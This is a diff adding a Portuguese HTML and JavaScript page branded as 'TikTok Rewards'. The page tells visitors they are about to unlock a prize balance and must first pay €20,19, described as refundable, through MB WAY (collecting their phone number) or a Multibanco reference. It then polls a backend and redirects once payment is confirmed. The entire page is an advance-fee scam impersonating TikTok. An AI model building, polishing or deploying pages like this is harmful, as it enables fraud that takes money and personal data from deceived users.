@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="pt-PT">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Pagamento — TikTok Rewards</title>
+<style>
+  *,*::before,*::after{box-sizing:border-box}
+  body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:linear-gradient(135deg,#fafafa 0%,#fff5f7 100%);color:#1a1a1a;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+  .card{width:100%;max-width:480px;background:#fff;border-radius:24px;box-shadow:0 20px 60px rgba(0,0,0,.08);border:1px solid rgba(0,0,0,.05);overflow:hidden}
+  .header{background:linear-gradient(135deg,#fe2c55,#ff4081);color:#fff;padding:20px 24px;text-align:center;font-weight:800;letter-spacing:.5px;text-transform:uppercase;font-size:13px}
+  .body{padding:28px 24px}
+  h1{margin:0 0 4px;font-size:20px;font-weight:800}
+  .subtitle{color:#666;font-size:13px;margin:0 0 22px}
+  .amount{background:#fff5f7;border:1px solid #ffd6dd;border-radius:16px;padding:14px 16px;display:flex;justify-content:space-between;align-items:center;margin-bottom:24px}
+  .amount-label{font-size:11px;font-weight:700;color:#888;text-transform:uppercase;letter-spacing:.5px}
+  .amount-value{font-size:24px;font-weight:900;color:#fe2c55}
+  .methods{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:18px}
+  .method{padding:18px 12px;border:2px solid #eaeaea;border-radius:16px;background:#fff;cursor:pointer;font-weight:700;font-size:14px;transition:all .15s;display:flex;flex-direction:column;align-items:center;gap:6px}
+  .method:hover{border-color:#fe2c55;background:#fff5f7}
+  .method.selected{border-color:#fe2c55;background:#fff5f7;box-shadow:0 4px 12px rgba(254,44,85,.15)}
+  .method-icon{font-size:22px}
+  .form{display:none;margin-top:8px}
+  .form.show{display:block}
+  label{font-size:12px;font-weight:700;color:#555;display:block;margin-bottom:6px}
+  input{width:100%;padding:14px 16px;border:2px solid #eaeaea;border-radius:14px;font-size:15px;font-weight:500;outline:none;transition:border-color .15s}
+  input:focus{border-color:#fe2c55}
+  .btn{width:100%;padding:16px;background:#fe2c55;color:#fff;border:0;border-radius:16px;font-size:15px;font-weight:800;cursor:pointer;margin-top:14px;text-transform:uppercase;letter-spacing:.5px;transition:transform .1s}
+  .btn:hover{transform:translateY(-1px)}
+  .btn:disabled{background:#ddd;cursor:not-allowed;transform:none}
+  .secure{text-align:center;color:#888;font-size:11px;margin-top:18px;display:flex;align-items:center;justify-content:center;gap:6px}
+  .panel{display:none;margin-top:8px}
+  .panel.show{display:block}
+  .ref-row{display:flex;justify-content:space-between;align-items:center;padding:14px 16px;background:#fafafa;border:1px solid #eee;border-radius:14px;margin-bottom:8px}
+  .ref-label{font-size:11px;text-transform:uppercase;font-weight:700;color:#888;letter-spacing:.5px}
+  .ref-value{font-size:18px;font-weight:900;font-variant-numeric:tabular-nums;color:#1a1a1a;letter-spacing:1px}
+  .copy{background:transparent;border:1px solid #ccc;border-radius:8px;padding:6px 10px;font-size:11px;font-weight:700;color:#555;cursor:pointer}
+  .copy:hover{background:#f5f5f5}
+  .status{display:flex;gap:12px;align-items:center;padding:14px;background:#fff5f7;border:1px solid #ffd6dd;border-radius:14px;margin-top:14px;font-size:13px;color:#555}
+  .spinner{width:18px;height:18px;border:2px solid #ffd6dd;border-top-color:#fe2c55;border-radius:50%;animation:spin .8s linear infinite;flex-shrink:0}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .err{display:none;color:#c1121f;background:#fde8eb;border:1px solid #f7c5cc;padding:12px 14px;border-radius:12px;font-size:13px;margin-top:12px}
+  .err.show{display:block}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="header">🔓 Confirmação de Identidade</div>
+  <div class="body">
+    <h1>Quase a desbloquear o saldo</h1>
+    <p class="subtitle">Conclua a confirmação para receber o seu prémio.</p>
+
+    <div class="amount">
+      <div>
+        <div class="amount-label">Valor</div>
+        <div style="font-size:11px;color:#888">Reembolsável após confirmação</div>
+      </div>
+      <div class="amount-value">€20,19</div>
+    </div>
+
+    <div id="step-pick">
+      <label>Escolha o método de pagamento</label>
+      <div class="methods">
+        <div class="method" data-method="mbway">
+          <span class="method-icon">📱</span>
+          <span>MB WAY</span>
+        </div>
+        <div class="method" data-method="multibanco">
+          <span class="method-icon">🏧</span>
+          <span>Multibanco</span>
+        </div>
+      </div>
+
+      <div class="form" id="form-mbway">
+        <label for="phone">Número de telemóvel MB Way</label>
+        <input type="tel" id="phone" placeholder="+351 9XX XXX XXX" autocomplete="tel">
+        <button class="btn" data-go="mbway">Pagar com MB Way</button>
+      </div>
+
+      <div class="form" id="form-multibanco">
+        <button class="btn" data-go="multibanco">Gerar Referência Multibanco</button>
+      </div>
+
+      <div class="err" id="err"></div>
+    </div>
+
+    <div class="panel" id="panel-mbway">
+      <h1 style="font-size:17px">Confirme na app MB Way</h1>
+      <p class="subtitle">Recebeu uma notificação no seu telemóvel para autorizar o pagamento de <strong>€20,19</strong>.</p>
+      <div class="status"><div class="spinner"></div><span id="mbway-status">A aguardar confirmação…</span></div>
+    </div>
+
+    <div class="panel" id="panel-multibanco">
+      <h1 style="font-size:17px">Pague em qualquer ATM ou homebanking</h1>
+      <p class="subtitle">Use os dados abaixo. A confirmação é automática.</p>
+      <div class="ref-row">
+        <div>
+          <div class="ref-label">Entidade</div>
+          <div class="ref-value" id="mb-entity">—</div>
+        </div>
+        <button class="copy" data-copy="mb-entity">Copiar</button>
+      </div>
+      <div class="ref-row">
+        <div>
+          <div class="ref-label">Referência</div>
+          <div class="ref-value" id="mb-reference">—</div>
+        </div>
+        <button class="copy" data-copy="mb-reference">Copiar</button>
+      </div>
+      <div class="ref-row">
+        <div>
+          <div class="ref-label">Valor</div>
+          <div class="ref-value">€20,19</div>
+        </div>
+      </div>
+      <p class="subtitle" id="mb-expiration" style="margin-top:10px"></p>
+      <div class="status"><div class="spinner"></div><span>A aguardar pagamento…</span></div>
+    </div>
+
+    <div class="secure">🔒 Pagamento processado pela WayMB</div>
+  </div>
+</div>
+
+<script>
+(function(){
+  const $ = (id) => document.getElementById(id);
+  const err = $('err');
+  let currentTx = null;
+  let pollTimer = null;
+
+  document.querySelectorAll('.method').forEach((el) => {
+    el.addEventListener('click', () => {
+      document.querySelectorAll('.method').forEach((m) => m.classList.remove('selected'));
+      el.classList.add('selected');
+      const m = el.dataset.method;
+      $('form-mbway').classList.toggle('show', m === 'mbway');
+      $('form-multibanco').classList.toggle('show', m === 'multibanco');
+      err.classList.remove('show');
+    });
+  });
+
+  document.querySelectorAll('[data-go]').forEach((btn) => {
+    btn.addEventListener('click', () => submit(btn.dataset.go, btn));
+  });
+
+  document.querySelectorAll('[data-copy]').forEach((btn) => {
+    btn.addEventListener('click', () => {
+      const text = $(btn.dataset.copy).textContent.trim();
+      navigator.clipboard?.writeText(text);
+      const orig = btn.textContent;
+      btn.textContent = 'Copiado!';
+      setTimeout(() => { btn.textContent = orig; }, 1500);
+    });
+  });
+
+  async function submit(method, btn) {
+    err.classList.remove('show');
+    const body = new URLSearchParams();
+    body.set('method', method);
+    if (method === 'mbway') {
+      const phone = $('phone').value.trim();
+      if (!phone) { showErr('Indique o seu número MB Way.'); return; }
+      body.set('phone', phone);
+    }
+    btn.disabled = true;
+    btn.textContent = 'A processar…';
+    try {
+      const r = await fetch('./api/criar', { method: 'POST', body });
+      const data = await r.json();
+      if (!r.ok) throw new Error(data.error || 'Falha ao gerar pagamento.');
+      currentTx = data.transactionID;
+      $('step-pick').style.display = 'none';
+      if (method === 'mbway') {
+        $('panel-mbway').classList.add('show');
+      } else {
+        $('mb-entity').textContent    = data.reference?.entity ?? '—';
+        $('mb-reference').textContent = data.reference?.reference ?? '—';
+        if (data.reference?.expiration) {
+          $('mb-expiration').textContent = 'Validade: ' + data.reference.expiration;
+        }
+        $('panel-multibanco').classList.add('show');
+      }
+      startPolling();
+    } catch (e) {
+      btn.disabled = false;
+      btn.textContent = method === 'mbway' ? 'Pagar com MB Way' : 'Gerar Referência Multibanco';
+      showErr(e.message);
+    }
+  }
+
+  function startPolling() {
+    if (!currentTx) return;
+    const tick = async () => {
+      try {
+        const r = await fetch('./api/status?id=' + encodeURIComponent(currentTx));
+        const data = await r.json();
+        if (data.status === 'COMPLETED') {
+          clearInterval(pollTimer);
+          window.location.href = './sucesso.html?id=' + encodeURIComponent(currentTx);
+        } else if (data.status === 'DECLINED') {
+          clearInterval(pollTimer);
+          $('mbway-status') && ($('mbway-status').textContent = 'Pagamento recusado. Tente novamente.');
+        }
+      } catch (_) {}
+    };
+    pollTimer = setInterval(tick, 4000);
+    tick();
+  }
+
+  function showErr(msg) {
+    err.textContent = msg;
+    err.classList.add('show');
+  }
+})();
+</script>
+</body>
+</html>
